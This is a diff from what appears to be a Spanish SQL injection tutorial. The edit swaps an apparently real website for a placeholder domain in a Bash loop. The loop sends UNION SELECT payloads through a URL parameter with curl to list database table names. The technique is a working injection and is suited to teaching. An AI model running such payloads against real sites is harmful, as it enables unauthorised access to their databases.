@@ -962,7 +962,7 @@ Nos montamos un script en **Bash** (o en otro lenguaje) para determinar de forma
 ```bash
 for i in $(seq 1 200); do
     echo -n "Para el número $i: "
-    curl --silent "http://www.aquariumlanzarote.com/contenidos.php?Id=-1+UNION+SELECT+1,table_name,3,4,5+from+information_schema.tables+limit+$i,1--%20-" | grep "eltitulo" | cut -d '>' -f 2 | awk '{print $1}' FS="<"
+    curl --silent "http://www.paginaweb.com/contenidos.php?Id=-1+UNION+SELECT+1,table_name,3,4,5+from+information_schema.tables+limit+$i,1--%20-" | grep "eltitulo" | cut -d '>' -f 2 | awk '{print $1}' FS="<"
 done
 ```
 
